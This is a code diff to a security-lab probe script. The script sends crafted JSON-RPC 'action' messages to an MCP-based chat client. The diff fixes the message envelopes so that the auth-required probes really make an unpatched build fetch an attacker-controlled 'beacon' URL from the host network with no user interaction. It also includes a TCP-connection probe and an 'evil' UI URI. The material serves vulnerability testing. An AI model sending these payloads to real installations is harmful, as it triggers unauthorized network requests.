@@ -159,22 +159,47 @@ function probes() {
 		{ id: 'A7-tcp', msg: { jsonrpc: '2.0', id: 900006, method: 'createTcpConnection', params: { host: '127.0.0.1', port: cfg.beaconPort } } },
 		// A21: MCP App UI content.
 		{ id: 'A21-ui', msg: { jsonrpc: '2.0', method: 'action', params: { channel: 'c', action: { type: 'chat/responsePart', part: { mcpApp: { uri: `ui://evil/${cfg.arm}` } } } } } },
-		// A1/A20, trigger form: an MCP auth requirement whose authorization server is the
-		// beacon. On an unpatched build the trusted window fetches it from the HOST network
-		// with no user interaction, which is the beacon hit. Upstream's discriminant is
-		// `kind: 'authRequired'` (McpServerStatus.AuthRequired) -- the hyphenated spelling is
-		// a different enum (ToolCallStatus, under `status`) and does not trigger this path
-		// (review round 2).
+		// A1/A20, trigger form: an MCP auth requirement whose protected resource is the beacon.
+		// On an unpatched build the trusted window fetches it from the HOST network with no
+		// user interaction (`_isAutoAuthenticatingMcpServer` → `autoAuthenticateMcpServer` →
+		// `resolveResource`), which is the beacon hit.
+		//
+		// The envelopes are upstream's real action shapes at a717861c, and the state
+		// discriminant is `kind: 'authRequired'` (McpServerStatus.AuthRequired). A probe with
+		// the wrong envelope is silently a no-op in the reducer, which would make U look
+		// contained: that false negative is what review rounds 2 and 3 caught.
+		//   SessionMcpServerStateChangedAction = { type, id, state, channel? }
 		{
-			id: 'A1-auth-metadata', msg: {
+			id: 'A1-mcp-state', msg: {
 				jsonrpc: '2.0', method: 'action', params: {
 					channel: 'c', action: {
 						type: 'session/mcpServerStateChanged',
-						servers: [{
-							id: 's', state: {
+						id: 'seclab-probe-server',
+						state: {
+							kind: 'authRequired',
+							reason: 'required',
+							resource: { resource: `${beacon}/mcp`, scopes_supported: ['x'] },
+							requiredScopes: [],
+						},
+					},
+				},
+			},
+		},
+		//   SessionCustomizationsChangedAction = { type, customizations: Customization[] }
+		{
+			id: 'A1-customizations', msg: {
+				jsonrpc: '2.0', method: 'action', params: {
+					channel: 'c', action: {
+						type: 'session/customizationsChanged',
+						customizations: [{
+							type: 'mcpServer',
+							id: 'seclab-probe-server',
+							uri: `${beacon}/cust.json`,
+							name: 'seclab-probe',
+							state: {
 								kind: 'authRequired',
 								reason: 'required',
-								resource: { resource: `${beacon}/mcp`, scopes_supported: ['x'] },
+								resource: { resource: `${beacon}/cust`, scopes_supported: ['x'] },
 								requiredScopes: [],
 							},
 						}],
@@ -182,23 +207,20 @@ function probes() {
 				},
 			},
 		},
-		{
-			id: 'A1-customizations-auth', msg: {
-				jsonrpc: '2.0', method: 'action', params: {
-					channel: 'c', action: {
-						type: 'session/customizationsChanged',
-						mcpServers: [{ id: 's', state: { kind: 'authRequired', resource: { resource: `${beacon}/cust` }, requiredScopes: [] } }],
-					},
-				},
-			},
-		},
+		//   ChatToolCallAuthRequiredAction extends ToolCallActionBase, auth: McpAuthRequirement
+		//   = { reason, resource, oauthClient?, requiredScopes? } -- no `status` field.
 		{
 			id: 'A1-toolcall-auth', msg: {
 				jsonrpc: '2.0', method: 'action', params: {
 					channel: 'c', action: {
 						type: 'chat/toolCallAuthRequired',
-						toolCallId: 't1',
-						auth: { status: 'auth-required', resource: { resource: `${beacon}/tool` } },
+						turnId: 'seclab-probe-turn',
+						toolCallId: 'seclab-probe-toolcall',
+						auth: {
+							reason: 'required',
+							resource: { resource: `${beacon}/tool`, scopes_supported: ['x'] },
+							requiredScopes: [],
+						},
 					},
 				},
 			},
